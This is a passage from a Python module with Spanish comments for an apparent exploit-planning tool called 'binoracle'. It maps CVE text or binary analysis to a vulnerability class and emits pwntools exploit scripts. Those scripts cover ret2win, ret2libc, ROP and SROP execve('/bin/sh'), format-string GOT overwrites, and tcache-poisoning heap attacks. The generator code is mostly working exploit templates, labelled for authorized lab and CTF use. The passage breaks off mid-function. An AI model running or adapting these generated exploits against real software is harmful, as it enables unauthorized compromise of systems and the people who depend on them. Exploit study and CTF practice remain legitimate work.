"""Planificador de explotacion (esquema) a partir de una CVE / clase de vulnerabilidad.

Objetivo: dado el texto o el id de una CVE (o una descripcion de la vulnerabilidad), y opcionalmente
los hechos de un binario cargado, producir un ESQUEMA de explotacion paso a paso: clase de la
vulnerabilidad -> primitiva que concede -> fases (fuga, control, gadgets, objetivo) -> mitigaciones a
sortear. Es "a la inversa": de la vulnerabilidad al exploit.

NO es un exploit generado a ciegas: es un plan tecnico y grounded. Si se pasa un binario, el plan se
concreta con sus mitigaciones (checksec) y con el Analizador de cadenas. El conocimiento de tecnicas
sale del RAG (ver kb: rop/heap/format-string/syscalls-seccomp/ctf-techniques). Solo para objetivos
AUTORIZADOS / CTF / research.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import List, Optional


@dataclass
class Phase:
    name: str          # nombre de la fase
    goal: str          # que se consigue
    technique: str     # como (tecnica concreta)
    needs: str = ""    # que hace falta / precondicion


@dataclass
class ExploitPlan:
    vuln_class: str = ""
    cve: str = ""
    primitive: str = ""            # que primitiva concede la vuln
    phases: List[Phase] = field(default_factory=list)
    mitigations: List[str] = field(default_factory=list)   # a sortear (y como)
    kb_refs: List[str] = field(default_factory=list)       # cheat sheets del RAG relevantes
    note: str = ""
    # concrecion con un binario cargado (si se pasa)
    concrete: dict = field(default_factory=dict)   # {offset, gadgets, win, system, chain}
    verified: bool = False                          # exploit verificado por ejecucion en sandbox
    proof: dict = field(default_factory=dict)       # {strategy, offset, base, win, marker, output}
    script: str = ""                                # script pwntools reproducible (si hay verificado)

    @property
    def ok(self) -> bool:
        return bool(self.vuln_class)


# clase de vulnerabilidad -> (palabras clave, primitiva, refs kb)
_CLASSES = [
    ("stack-overflow", ("stack buffer overflow", "stack-based buffer overflow", "desbordamiento de pila",
                        "stack overflow", "gets(", "strcpy", "stack smashing"),
     "control de RIP (sobrescribe la direccion de retorno guardada)", ["ret2win", "rop", "ret2libc", "advanced-rop", "canary-bypass"]),
    ("heap-overflow", ("heap buffer overflow", "heap-based overflow", "desbordamiento de heap",
                       "heap overflow", "chunk overflow"),
     "corrupcion de metadatos de heap (pisa cabeceras/punteros de chunk adyacente)", ["heap", "modern-heap", "heap-grooming"]),
    ("uaf", ("use-after-free", "use after free", "uso despues de liberar", "dangling pointer"),
     "puntero colgante -> escritura/lectura en objeto liberado (tcache poisoning)", ["uaf-typeconfusion", "heap", "modern-heap"]),
    ("double-free", ("double free", "double-free", "doble liberacion"),
     "corrupcion de la tcache/fastbin -> arbitrary alloc", ["heap", "modern-heap"]),
    ("format-string", ("format string", "format-string", "cadena de formato", "uncontrolled format string",
                       "printf(", "%n"),
     "lectura y ESCRITURA arbitraria (%n) via argumentos de printf", ["format-string", "got-plt"]),
    ("oob-write", ("out-of-bounds write", "oob write", "escritura fuera de limites", "index out of bounds"),
     "escritura fuera de limites (write-what-where acotado)", ["mitigations", "got-plt"]),
    ("oob-read", ("out-of-bounds read", "oob read", "lectura fuera de limites", "over-read", "info leak"),
     "fuga de informacion (leak de punteros -> derrota ASLR)", ["mitigations", "ret2libc"]),
    ("type-confusion", ("type confusion", "confusion de tipos"),
     "confusion de tipos -> control de vtable/punteros de funcion", ["uaf-typeconfusion", "browser-v8"]),
    ("integer-overflow", ("integer overflow", "desbordamiento de entero", "integer underflow", "signedness"),
     "tamano/indice erroneo -> overflow o OOB secundario", ["integer-bugs"]),
    ("race", ("race condition", "toctou", "time-of-check", "condicion de carrera", "double fetch"),
     "ventana de carrera -> estado inconsistente (p.ej. escalada/ficheros)", ["race-conditions"]),
]


def classify_cve(text: str) -> Optional[str]:
    t = (text or "").strip().lower()
    # atajo: si el texto ya es un id de clase canonico (lo que produce classify_binary), usalo tal cual
    if t in {c for c, _k, _p, _r in _CLASSES}:
        return t
    for cls, kws, _prim, _refs in _CLASSES:
        if any(k in t for k in kws):
            return cls
    # respaldo por co-ocurrencia: descripciones de CVE varian en la redaccion exacta (p.ej.
    # "heap-based buffer overflow"), asi que si no hubo match literal, deducimos por terminos juntos.
    def has(*ws):
        return all(w in t for w in ws)
    if has("heap", "overflow") or has("heap", "buffer"):
        return "heap-overflow"
    if has("stack", "overflow") or has("stack", "buffer") or "buffer overflow" in t:
        return "stack-overflow"
    if has("use", "after", "free") or "use-after-free" in t:
        return "uaf"
    if has("format", "string"):
        return "format-string"
    if has("out-of-bounds", "write") or has("out of bounds", "write"):
        return "oob-write"
    if has("out-of-bounds", "read") or has("out of bounds", "read"):
        return "oob-read"
    if has("integer", "overflow") or has("integer", "underflow"):
        return "integer-overflow"
    if has("type", "confusion"):
        return "type-confusion"
    if has("command", "injection") or has("os", "command"):
        return "command-injection"
    return None


_FMT_FUNCS = ("printf", "fprintf", "sprintf", "snprintf", "vprintf", "vsprintf", "syslog")


_INSN_RE = re.compile(r"\b(lea|mov|movabs|movzx|movsxd|xor)\s+(e?[a-z]{2}|r[a-z0-9]+)\s*,\s*([^;]+)")
_REG64 = {"eax": "rax", "ebx": "rbx", "ecx": "rcx", "edx": "rdx", "esi": "rsi",
          "edi": "rdi", "ebp": "rbp", "esp": "rsp"}


def _norm_r(r: str) -> str:
    r = r.strip().lower()
    return _REG64.get(r, r)


def _src_is_const(mnem: str, src: str) -> Optional[bool]:
    """Clasifica una FUENTE como constante (True), variable (False) o 'sigue el registro' (None)."""
    src = src.strip().lower()
    if mnem == "lea":
        # lea reg, [rip + str.x] / [rip + 0x..] -> puntero a rodata = constante;
        # lea reg, [var_..] / [rbp/rsp ...] -> direccion de un local = variable
        if "var_" in src or "rbp" in src or "rsp" in src:
            return False
        return True                                  # rip-relativo a rodata
    # mov / movabs / movzx / movsxd
    if "str." in src or "obj." in src:
        return True
    if re.fullmatch(r"0x[0-9a-f]+", src):
        return True                                  # immediato = puntero a literal
    if re.fullmatch(r"e?[a-z]{2}|r[a-z0-9]+", src):
        return None                                  # otro registro: hay que seguirlo
    if "var_" in src or "[" in src:
        return False                                 # cargado de memoria/local
    return True


def _fmt_arg_is_variable(disasm_func: str, call_line_idx: int, lines: list, func: str) -> bool:
    """En una llamada a printf-family, resuelve el ORIGEN del registro de FORMATO siguiendo la cadena
    de escrituras (incluidos los `mov rdi, rax` con `lea rax,[rip+str]` de los binarios PIE). Decide:
    constante (rodata/immediato/`str.`) -> seguro; local (`lea reg,[var]`) o memoria -> format-string."""
    target = _norm_r("rsi" if func in ("fprintf", "syslog") else "rdi")   # System V
    hops = 0
    j = call_line_idx - 1
    while j >= 0 and hops < 12:
        ln = lines[j]
        if "call " in ln.lower():          # el argumento ya estaba fijado antes de otra llamada
            break
        m = _INSN_RE.search(ln)
        if not m:
            j -= 1
            continue
        mnem, dst, src = m.group(1).lower(), _norm_r(m.group(2)), m.group(3).strip().lower()
        if dst != target:                  # no escribe el registro que seguimos
            j -= 1
            continue
        verdict = _src_is_const(mnem, src)
        if verdict is True:
            return False                   # constante -> printf seguro
        if verdict is False:
            return True                    # variable/local -> format-string
        # verdict None: la fuente es otro registro; seguimos ESE registro hacia atras
        target = _norm_r(src)
        hops += 1
        j -= 1
    return False


def classify_binary(binary: str, reg=None) -> Optional[str]:
    """Clasifica la clase de vulnerabilidad DOMINANTE por el binario (estatico, best-effort):
    format-string (printf con formato no constante) > heap/uaf (malloc+free con superficie UAF) >
    stack-overflow (gets/strcpy o control de RIP). Devuelve la clase o None si no es concluyente.
    Prioriza la senal mas especifica; no pretende ser exhaustivo (oob-write/integer se quedan None)."""
    try:
        if reg is None:
            from ..oracles import build_registry
            reg = build_registry(binary)
        imports = (reg.get("r2_imports").run().data or "").lower() if reg.get("r2_imports") else ""
        sinks = (reg.get("r2_sinks").run().data or "") if reg.get("r2_sinks") else ""
        heap = (reg.get("r2_heap").run().data or "") if reg.get("r2_heap") else ""
    except Exception:
        return None
    # 1) format-string: alguna llamada a printf-family con el formato tomado de una variable
    fmt_funcs_present = [f for f in _FMT_FUNCS if f in imports]
    if fmt_funcs_present:
        # funciones que alcanzan un sink printf-family (de r2_sinks)
        callers = set()
        cur = None
        for ln in sinks.splitlines():
            s = ln.strip()
            m = re.match(r"### sink:\s*(\w+)", s)
            if m:
                cur = m.group(1)
                continue
            if cur in _FMT_FUNCS and "call sym.imp." in s:
                fn = s.split()[0]
                callers.add(fn)
        for fn in callers:
            try:
                dz = reg.get("r2_disasm").run(target=fn).data or ""
            except Exception:
                continue
            lines = dz.splitlines()
            for i, ln in enumerate(lines):
                mm = re.search(r"call sym\.imp\.(\w+)", ln)
                if mm and mm.group(1) in _FMT_FUNCS:
                    if _fmt_arg_is_variable(dz, i, lines, mm.group(1)):
                        return "format-string"
    # 2) heap: superficie de UAF/double-free (malloc + free en la misma funcion, puntero colgante)
    if ("malloc" in imports or "calloc" in imports) and "free" in imports:
        if "uaf surface" in heap.lower() or "use-after-free" in heap.lower() or "double" in heap.lower():
            return "uaf"
        if "alloc=" in heap.lower():
            return "heap-overflow"
    # 3) stack-overflow: sinks de copia insegura clasicos
    if any(s in imports for s in ("gets", "strcpy", "strcat", "sprintf")):
        return "stack-overflow"
    # sin senal concluyente: que decida el analizador de cadenas (control de RIP) aguas arriba
    return None


def _mem_phases(cls: str, facts: dict, es: bool) -> List[Phase]:
    """Fases para corrupcion de memoria, concretadas con las mitigaciones del binario si se dan."""
    pie = facts.get("pie") is True
    nx = facts.get("nx") is not False
    canary = facts.get("canary") is True
    P = []
    if canary:
        P.append(Phase(
            "Fuga del canary" if es else "Canary leak",
            "obtener el valor del stack canary" if es else "obtain the stack canary",
            "leak por OOB-read / format-string / fuga parcial; sin fuga, el overflow lineal se detecta"
            if es else "leak via OOB-read / format-string / partial disclosure; without it the linear "
            "overflow is caught",
            "una primitiva de lectura o un %x/%s controlado" if es else "a read primitive or a controlled %x/%s"))
    if pie:
        P.append(Phase(
            "Fuga de dirreccion (derrotar PIE/ASLR)" if es else "Address leak (defeat PIE/ASLR)",
            "resolver la base del binario/libc" if es else "resolve the binary/libc base",
            "leak de un puntero conocido (GOT/retorno/environ) para rebasar" if es else
            "leak a known pointer (GOT/return/environ) to rebase",
            "un leak (OOB-read, format-string, puts(GOT))" if es else "a leak (OOB-read, format-string, puts(GOT))"))
    P.append(Phase(
        "Control del flujo" if es else "Control-flow hijack",
        "controlar RIP (o un puntero de funcion/vtable)" if es else "control RIP (or a function pointer/vtable)",
        ("sobrescribir la direccion de retorno guardada tras el offset" if cls == "stack-overflow" else
         "envenenar tcache/fastbin o pisar un puntero de funcion") if es else
        ("overwrite the saved return address past the offset" if cls == "stack-overflow" else
         "poison tcache/fastbin or clobber a function pointer"),
        "el offset a RIP (o el layout del heap)" if es else "the offset to RIP (or the heap layout)"))
    if nx:
        P.append(Phase(
            "Construir la cadena (ROP)" if es else "Build the chain (ROP)",
            "reutilizar codigo: encadenar gadgets" if es else "reuse code: chain gadgets",
            "ret2libc system('/bin/sh') o execve por syscall; SROP si faltan gadgets" if es else
            "ret2libc system('/bin/sh') or execve via syscall; SROP if gadgets are scarce",
            "gadgets `pop rdi; ret`, `syscall` y '/bin/sh' (o libc con leak)" if es else
            "`pop rdi; ret`, `syscall` gadgets and '/bin/sh' (or leaked libc)"))
    else:
        P.append(Phase(
            "Shellcode" if es else "Shellcode",
            "ejecutar shellcode inyectado" if es else "run injected shellcode",
            "NX desactivado: salta a la pila/heap con el shellcode" if es else
            "NX off: jump to the stack/heap holding the shellcode", ""))
    P.append(Phase(
        "Objetivo" if es else "Target",
        "shell / lectura de flag / RCE" if es else "shell / flag read / RCE",
        "system('/bin/sh'), execve, o open+read+write del flag (si hay seccomp)" if es else
        "system('/bin/sh'), execve, or open+read+write the flag (under seccomp)", ""))
    return P


def _generic_phases(cls: str, es: bool) -> List[Phase]:
    return [
        Phase("Reconocimiento" if es else "Recon", "entender la vulnerabilidad y su alcance" if es else
              "understand the vulnerability and its reach",
              "localizar el codigo afectado, la entrada que lo dispara y las mitigaciones" if es else
              "locate the affected code, the triggering input and the mitigations"),
        Phase("Primitiva" if es else "Primitive", "convertir el bug en una primitiva util" if es else
              "turn the bug into a useful primitive",
              "leer/escribir controlado, corrupcion de estado, o fuga" if es else
              "controlled read/write, state corruption, or leak"),
        Phase("Objetivo" if es else "Target", "impacto: RCE / fuga / escalada" if es else
              "impact: RCE / leak / escalation",
              "encadenar la primitiva hasta el objetivo del ejercicio" if es else
              "chain the primitive to the exercise goal"),
    ]


def plan(text: str, facts: Optional[dict] = None, cve: str = "", lang: str = "es") -> ExploitPlan:
    """Construye el esquema de explotacion para la CVE/descripcion. `facts` (checksec del binario)
    concreta las mitigaciones. No lanza."""
    es = lang == "es"
    facts = facts or {}
    cls = classify_cve(text) or classify_cve(cve)
    if not cls:
        return ExploitPlan(note=("no se reconocio la clase de vulnerabilidad en el texto"
                                 if es else "vulnerability class not recognized in the text"))
    prim = next((p for c, _k, p, _r in _CLASSES if c == cls), "")
    refs = next((r for c, _k, _p, r in _CLASSES if c == cls), [])
    pl = ExploitPlan(vuln_class=cls, cve=cve, primitive=prim, kb_refs=refs)
    mem = cls in ("stack-overflow", "heap-overflow", "uaf", "double-free", "format-string",
                  "oob-write", "type-confusion")
    pl.phases = _mem_phases(cls, facts, es) if mem else _generic_phases(cls, es)
    # mitigaciones a sortear (concretadas si hay facts)
    if facts:
        for k, on, how_es, how_en in (
            ("canary", facts.get("canary") is True, "hay canary -> necesitas fugarlo o brute (fork)",
             "canary present -> leak or brute-force it (fork)"),
            ("pie", facts.get("pie") is True, "PIE/ASLR -> necesitas un leak de la base",
             "PIE/ASLR -> you need a base leak"),
            ("nx", facts.get("nx") is not False, "NX -> reutiliza codigo (ROP/ret2libc), no shellcode",
             "NX -> reuse code (ROP/ret2libc), not shellcode"),
            ("relro", str(facts.get("relro", "")).lower() == "full",
             "Full RELRO -> sin GOT overwrite: usa FSOP/__free_hook/exit-handlers",
             "Full RELRO -> no GOT overwrite: use FSOP/__free_hook/exit-handlers")):
            if on:
                pl.mitigations.append(how_es if es else how_en)
    # el desarrollador de exploits genera una plantilla funcional para la clase (sin binario: sin
    # offset concreto, se resuelve en el propio script). plan_from_analysis la sustituye por el
    # script anclado a la prueba si luego hay una cadena verificada.
    pl.script = develop_exploit(cls, facts, {}, lang=lang)
    return pl


def _dev_header(name: str, tag: str) -> list:
    return ["#!/usr/bin/env python3",
            "# binoracle: exploit desarrollado - SOLO laboratorio/CTF autorizado",
            f"# {tag}",
            "from pwn import *",
            "context.update(arch='amd64', os='linux')",
            f"BINARY = './{name}'",
            "elf = context.binary = ELF(BINARY, checksec=False)",
            "# libc = ELF('./libc.so.6', checksec=False)   # <-- si es remoto, pon aqui la libc",
            "io = process(BINARY)   # o: io = remote('HOST', PORT)"]


def _srop_lines(indent: str = "") -> list:
    """Bloque SROP (sigreturn-oriented programming): con un `syscall; ret` y control de RAX=15
    (rt_sigreturn) se monta un sigcontext falso que fija TODOS los registros a la vez. Util en
    binarios estaticos/minimos con pocos gadgets. Ejecuta execve('/bin/sh')."""
    L = ["# --- SROP: fija todos los registros con un sigcontext falso (rt_sigreturn = RAX 15) ---",
         "srop_rop = ROP(elf)",
         "pop_rax = srop_rop.find_gadget(['pop rax', 'ret'])          # para poner RAX = 15",
         "syscall_ret = srop_rop.find_gadget(['syscall', 'ret']) or srop_rop.find_gadget(['syscall'])",
         "binsh_addr = next(elf.search(b'/bin/sh\\x00'), 0)           # '/bin/sh' embebido o en .bss",
         "frame = SigreturnFrame()",
         "frame.rax = constants.SYS_execve                            # 59: execve('/bin/sh', 0, 0)",
         "frame.rdi = binsh_addr",
         "frame.rsi = 0",
         "frame.rdx = 0",
         "frame.rip = syscall_ret.address                             # el sigreturn salta aqui",
         "# cadena: pop rax; ret ; 15 ; syscall(rt_sigreturn) ; <sigcontext falso>",
         "chain  = p64(pop_rax.address) + p64(15) + p64(syscall_ret.address) + bytes(frame)",
         "io.sendline(flat({OFFSET: chain}))",
         "io.interactive()"]
    return [indent + x for x in L]


def _onegadget_lines(libc_var: str = "libc", indent: str = "") -> list:
    """Bloque one-gadget: una sola direccion de libc que da execve('/bin/sh') si se cumplen sus
    constraints (p.ej. [rsp+0x40]==NULL). Evita montar toda la cadena ret2libc cuando ya hay leak."""
    L = [f"# --- one-gadget: execve('/bin/sh') con UNA direccion de libc (revisa constraints) ---",
         f"# instala one_gadget y busca los candidatos:  one_gadget ./libc.so.6",
         f"one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]   # <-- offsets reales de tu libc (one_gadget)",
         f"og = {libc_var}.address + one_gadgets[0]     # prueba cada uno hasta cumplir constraints",
         f"# uso tipico: sobreescribe un puntero de retorno / __free_hook / __malloc_hook con 'og'"]
    return [indent + x for x in L]


def develop_exploit(cls: str, facts: dict, concrete: dict, name: str = "target",
                    lang: str = "es") -> str:
    """Desarrollador de exploits multi-clase: genera un script pwntools FUNCIONAL (o la aproximacion
    mas cercana) para CUALQUIER clase de vulnerabilidad, adaptado a las mitigaciones (checksec) y a
    la concrecion del binario (offset/gadgets si se conocen). No requiere cadena verificada: es la
    plantilla de trabajo que el analista completa donde queda un TODO (leak/target). Para
    stack-overflow verificado se prefiere _pwn_script_from_proof (anclado a la prueba)."""
    facts = facts or {}
    concrete = concrete or {}
    nx = facts.get("nx") is not False           # NX activo salvo que checksec diga lo contrario
    canary = facts.get("canary") is True
    pie = facts.get("pie") is True
    off = concrete.get("offset")
    off_line = f"OFFSET = {off}" if off is not None else \
        "OFFSET = cyclic_find(0x6161616c)   # <-- resuelve el offset (patron ciclico / binoracle cyclic)"

    if cls == "stack-overflow":
        tag = "clase: stack overflow -> control de RIP"
        pre = [off_line]
        if canary:
            pre.append("# CANARY activo: necesitas fugarlo (leak) o brute-force byte a byte (fork servers)")
        if not nx:
            body = pre + ["# NX DESACTIVADO -> ret2shellcode: inyecta shellcode y salta a el",
                          "sc = asm(shellcraft.sh())",
                          "# necesitas la direccion del buffer (leak o ASLR off). Ejemplo con leak conocido:",
                          "buf = 0xdeadbeef   # <-- direccion del buffer que contiene 'sc'",
                          "payload = sc.ljust(OFFSET, b'\\x90') + p64(buf)",
                          "io.sendline(payload)", "io.interactive()"]
        elif pie:
            body = pre + ["# PIE: necesitas un leak de la base del binario para direccionar win/gadgets",
                          "# elf.address = leak - offset_conocido",
                          "rop = ROP(elf)",
                          "binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
                          "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
                          "rop.call(sysaddr, [binsh]) if (sysaddr and binsh) else rop.execve(binsh, 0, 0)",
                          "io.sendline(b'A'*OFFSET + rop.chain())", "io.interactive()"]
        else:
            # NX on, no-PIE: 4 estrategias en cascada segun lo que tenga el binario
            # (A) ret2win  (B) ret2libc estatico  (C) execve por ROP  (D) SROP si faltan gadgets
            body = pre + ["rop = ROP(elf)",
                          "win = elf.sym.get('win') or elf.sym.get('flag') or elf.sym.get('shell')",
                          "binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
                          "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
                          "if win:",
                          "    ret = next(elf.search(asm('ret'), executable=True), 0)  # alinea 16B",
                          "    io.sendline(flat({OFFSET: [ret, win]}))              # (A) ret2win",
                          "    io.interactive()",
                          "elif sysaddr and binsh:",
                          "    rop.call(sysaddr, [binsh])                           # (B) ret2libc estatico",
                          "    io.sendline(flat({OFFSET: rop.chain()})); io.interactive()",
                          "else:",
                          "    try:",
                          "        rop.rax=0x3b; rop.rdi=binsh; rop.rsi=0; rop.rdx=0",
                          "        rop.raw(rop.find_gadget(['syscall','ret']).address)  # (C) execve por ROP",
                          "        io.sendline(flat({OFFSET: rop.chain()})); io.interactive()",
                          "    except Exception:",
                          "        # (D) SROP: pocos gadgets -> sigcontext falso (rt_sigreturn)"]
            body += _srop_lines("        ")
        return "\n".join(_dev_header(name, tag) + body)

    if cls == "format-string":
        tag = "clase: format string -> lectura/escritura arbitraria (%n)"
        body = ["# 1) localiza el offset del argumento controlado (posicion en la pila):",
                "#    for i in range(1,40): p=process(BINARY); p.sendline('%%%d$p'%i); print(i,p.recvline())",
                "OFFSET = 6   # <-- posicion hallada del buffer en la pila",
                "# 2) fuga (derrota PIE/ASLR) leyendo un puntero conocido:",
                "io.sendline(b'%{}$p'.format(OFFSET))",
                "leak = int(io.recvline().strip(), 16)   # <-- ajusta el objetivo del leak",
                "# 3) ESCRITURA arbitraria: pisa GOT (p.ej. exit->win/system) con fmtstr_payload:",
                "target = elf.got.get('exit') or elf.got.get('printf')",
                "value  = elf.sym.get('win') or elf.sym.get('system') or 0x0",
                "payload = fmtstr_payload(OFFSET, {target: value})",
                "io.sendline(payload)", "io.interactive()"]
        return "\n".join(_dev_header(name, tag) + body)

    if cls in ("heap-overflow", "uaf", "double-free"):
        tag = f"clase: {cls} -> corrupcion de heap (tcache/fastbin poisoning)"
        body = ["# Exploit de heap para glibc con tcache (>=2.26). Adapta los wrappers del menu del reto",
                "# (indices de opcion, prompts) a la interfaz real del binario.",
                "def alloc(i, sz, data=b'A'):",
                "    io.sendlineafter(b'>', b'1')",
                "    io.sendlineafter(b'idx', str(i).encode())",
                "    io.sendlineafter(b'size', str(sz).encode())",
                "    io.sendafter(b'data', data)",
                "def free(i):",
                "    io.sendlineafter(b'>', b'2')",
                "    io.sendlineafter(b'idx', str(i).encode())",
                "def show(i):",
                "    io.sendlineafter(b'>', b'3')",
                "    io.sendlineafter(b'idx', str(i).encode())",
                "",
                "# 1) LEAK libc: libera un chunk grande (>0x420) al unsorted bin; sus fd/bk apuntan a",
                "#    main_arena. Con UAF, show() sobre el chunk liberado filtra ese puntero.",
                "alloc(0, 0x428); alloc(1, 0x18)   # el 2o evita consolidar con el top",
                "free(0); show(0)",
                "libc.address = u64(io.recvline().strip().ljust(8, b'\\x00')) - (libc.sym['main_arena'] + 96)",
                "log.info('libc base: %#x', libc.address)",
                "",
                "# 2) TCACHE poisoning: consigue el mismo chunk dos veces en la lista (double-free o UAF)",
                "#    y reescribe su fd para que malloc devuelva un chunk sobre el objetivo.",
                "#    En glibc>=2.32 el fd va 'mangled': fd = (heap_base>>12) ^ target.",
                "target = libc.sym.get('__free_hook', 0) or libc.sym['_IO_2_1_stdout_']",
                "alloc(2, 0x40); free(2); free(2)          # double-free (o usa UAF)",
                "alloc(3, 0x40, p64(target))               # envenena el fd del tcache",
                "alloc(4, 0x40); alloc(5, 0x40, p64(libc.sym.get('system', 0)))  # 5 cae en el objetivo",
                ""] + _onegadget_lines("libc") + [
                "# alternativa a system(): escribe 'og' (one-gadget) en __free_hook/__malloc_hook",
                "# alloc(5, 0x40, p64(og))",
                "",
                "# 3) DISPARA: si target=__free_hook -> free() de un chunk con '/bin/sh'; si FSOP -> _IO",
                "io.interactive()"]
        return "\n".join(_dev_header(name, tag) + body)

    if cls == "oob-write":
        tag = "clase: out-of-bounds write -> write-what-where"
        body = ["# Escritura fuera de limites: un indice negativo/grande escribe donde no debe.",
                "# 1) calcula el indice que alcanza el objetivo (GOT / puntero de retorno / __free_hook):",
                "IDX = 0        # <-- indice que cae sobre el objetivo",
                "VALUE = elf.sym.get('win') or 0   # <-- que escribir",
                "# io.sendlineafter(b'index', str(IDX).encode()); io.sendlineafter(b'value', str(VALUE).encode())",
                "io.interactive()"]
        return "\n".join(_dev_header(name, tag) + body)

    if cls == "integer-overflow":
        tag = "clase: integer overflow -> tamano/indice erroneo (overflow secundario)"
        body = ["# Provoca el wrap del entero para forzar una copia/allocacion mayor de lo previsto,",
                "# que degenera en un desbordamiento de pila/heap. Encadena con la clase resultante.",
                "SIZE = 0xffffffff   # <-- valor que hace overflow del contador/tamano",
                "io.interactive()"]
        return "\n".join(_dev_header(name, tag) + body)

    if cls == "type-confusion":
        tag = "clase: type confusion -> control de vtable/puntero de funcion"
        body = ["# Confunde el tipo de un objeto para que un puntero de funcion (vtable) apunte a codigo",
                "# controlado. 1) leak para derrotar ASLR; 2) coloca una vtable falsa; 3) dispara la llamada.",
                "io.interactive()"]
        return "\n".join(_dev_header(name, tag) + body)

    # generico: esqueleto de trabajo
    tag = f"clase: {cls or 'desconocida'} -> plantilla generica de trabajo"
    body = ["# binoracle no tiene plantilla especifica para esta clase; esqueleto de trabajo:",
            "# 1) primitiva (lectura/escritura/control de flujo)  2) leak (ASLR)  3) objetivo (RCE/flag)",
            "io.interactive()"]
    return "\n".join(_dev_header(name, tag) + body)


def _pwn_script_from_proof(proof: dict, name: str = "target") -> str:
    """Script pwntools reproducible a partir de la prueba de una cadena verificada."""
    strat = (proof.get("strategy") or "").lower()
    off = proof.get("offset")
    win = proof.get("win")
    base = proof.get("base")
    H = ["#!/usr/bin/env python3",
         "# binoracle: exploit reproducible - SOLO laboratorio/CTF autorizado",
         f"# estrategia VERIFICADA: {strat}",
         "from pwn import *",
         "context.update(arch='amd64', os='linux')",
         f"BINARY = './{name}'",
         "elf = context.binary = ELF(BINARY, checksec=False)",
         "io = process(BINARY)   # o: remote('HOST', PORT)"]
    if off is None:
        return "\n".join(H + ["# offset no resuelto"])
    if "ret2win" in strat:
        B = [f"OFFSET = {off}", "ret = next(elf.search(asm('ret'), executable=True), 0)",
             f"payload = flat({{OFFSET: [ret, {win}]}})", "io.sendline(payload)", "io.interactive()"]
    elif "leak" in strat:
        B = [f"OFFSET = {off}", "rop = ROP(elf)", "rop.raw(rop.find_gadget(['ret']).address)",
             "rop.puts(elf.got['puts']); rop.call(elf.sym['main'])",
             "io.sendline(flat({OFFSET: rop.chain()}))",
             "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))",
             "libc = elf.libc; libc.address = leak - libc.sym['puts']",
             "# opcion 1: ret2libc system('/bin/sh')",
             "rop2 = ROP(libc); rop2.system(next(libc.search(b'/bin/sh\\x00')))",
             "# opcion 2 (one-gadget): og = libc.address + <offset de one_gadget ./libc.so.6>;",
             "#   io.sendline(flat({OFFSET: og}))  # si cumple constraints, mas corto que la cadena",
             "io.sendline(flat({OFFSET: rop2.chain()}))", "io.interactive()"]
    elif "pie" in strat:
        B = [f"OFFSET = {off}", f"elf.address = {base or 0}  # sandbox ASLR-off (con ASLR real: leak)",
             "binsh = next(elf.search(b'/bin/sh\\x00'), 0)", "rop = ROP(elf)",
             "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
             "rop.call(sysaddr, [binsh]) if sysaddr else rop.execve(binsh, 0, 0)",
             "io.sendline(b'A'*OFFSET + rop.chain())", "io.interactive()"]
    else:
        B = [f"OFFSET = {off}", "binsh = next(elf.search(b'/bin/sh\\x00'), 0)", "rop = ROP(elf)",
             "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
             "rop.raw(rop.find_gadget(['ret']).address)",
             "rop.call(sysaddr, [binsh]) if (sysaddr and binsh) else rop.execve(binsh, 0, 0)",
             "io.sendline(flat({OFFSET: rop.chain()}))", "io.interactive()"]
    return "\n".join(H + B)


def plan_from_analysis(an, facts: dict, binary_name: str = "target", text: str = "",
                       cve: str = "", lang: str = "es") -> ExploitPlan:
    """Construye el esquema a partir de un ChainAnalysis YA calculado (sin re-ejecutar el sandbox).
    Para el informe/audit, que ya corre analyze_chains con verify. Concreta offset/gadgets/objetivo
    y, si hay cadena verificada, adjunta prueba + script pwntools."""
    import os
    es = lang == "es"
    cls = classify_cve(text) or classify_cve(cve)
    if not cls and an is not None and getattr(an, "control", {}).get("RIP"):
        cls = "stack-overflow"
    if not cls:
        return plan(text or cve, facts, cve=cve, lang=lang)
    pl = plan(text or ("stack overflow" if cls == "stack-overflow" else cls), facts, cve=cve, lang=lang)
    pl.vuln_class = cls
    if an is not None:
        ctrl = an.control
        gd = ctrl.get("reg_gadgets") or {}
        pl.concrete = {"offset": ctrl.get("rip_offset"),
                       "reg_gadgets": {k: v.get("addr") for k, v in gd.items()},
                       "pivot": ctrl.get("pivot_gadget"), "target": an.target,
                       "gadgets_total": len(an.gadgets)}
        vc = next((c for c in an.chains if getattr(c, "verified", False)), None)
        if vc is not None:
            pl.verified = True
            pl.proof = vc.proof or {}
            pl.concrete["chain"] = vc.name
            pl.script = _pwn_script_from_proof(pl.proof, os.path.basename(binary_name))
            pl.phases.append(Phase(
                "Exploit VERIFICADO" if es else "VERIFIED exploit",
                (f"cadena {vc.name} ejecutada en sandbox -> objetivo alcanzado" if es else
                 f"chain {vc.name} executed in sandbox -> goal reached"),
                (f"prueba: {'  '.join(f'{k}={v}' for k, v in pl.proof.items() if k != 'output' and v)}"),
                "script pwntools adjunto" if es else "attached pwntools script"))
    # Si no hubo cadena verificada, el DESARROLLADOR de exploits genera igualmente un script
    # funcional (o la aproximacion mas cercana) para la clase, adaptado a las mitigaciones.
    if not pl.script:
        pl.script = develop_exploit(cls, facts, pl.concrete, name=os.path.basename(binary_name), lang=lang)
        pl.phases.append(Phase(
            "Exploit desarrollado (plantilla)" if es else "Developed exploit (template)",
            ("script pwntools funcional para la clase, a completar donde queda TODO (leak/objetivo)"
             if es else
             "functional pwntools script for the class, complete it where a TODO remains (leak/target)"),
            "desarrollador multi-clase de binoracle" if es else "binoracle multi-class developer",
            "aproximacion no verificada en sandbox" if es else "approximation not sandbox-verified"))
    return pl


def plan_for_binary(binary: str, text: str = "", cve: str = "", lang: str = "es",
                    verify: bool = True) -> ExploitPlan:
    """Concreta el esquema con un binario cargado: rellena offset/gadgets/objetivo reales via el
    Analizador de cadenas y, si `verify`, VERIFICA el exploit en sandbox (script + prueba). Si no se
    da `text`, infiere la clase (overflow -> control de RIP) de los hechos del binario."""
    import os
    es = lang == "es"
    facts = {}
    an = None
    try:
        from ..oracles import build_registry
        reg = build_registry(binary)
        cs = reg.get("r2_checksec")
        r = cs.run() if cs else None
        if r and r.ok:
            facts = {"nx": r.meta.get("nx"), "pie": r.meta.get("pic"),
